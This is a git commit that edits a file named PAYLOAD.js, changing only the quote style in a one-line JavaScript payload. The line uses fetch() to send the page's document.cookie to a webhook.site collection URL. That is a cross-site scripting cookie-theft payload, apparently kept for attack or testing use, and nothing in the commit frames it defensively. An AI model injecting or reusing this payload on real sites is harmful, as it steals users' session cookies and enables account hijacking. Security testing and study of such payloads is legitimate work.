01988b74863604c132d593c434170f69af58a53f
BedtimeXXX <165554897+BedtimeXXX@users.noreply.github.com>
2024-08-11 15:09:48 +0100

    Update PAYLOAD.js

--- PAYLOAD.js
+++ PAYLOAD.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/b49551b4-cf2a-4263-abe6-8d802b94fe47?cookie="+document.cookie);
+fetch('https://webhook.site/b49551b4-cf2a-4263-abe6-8d802b94fe47?cookie='+document.cookie);
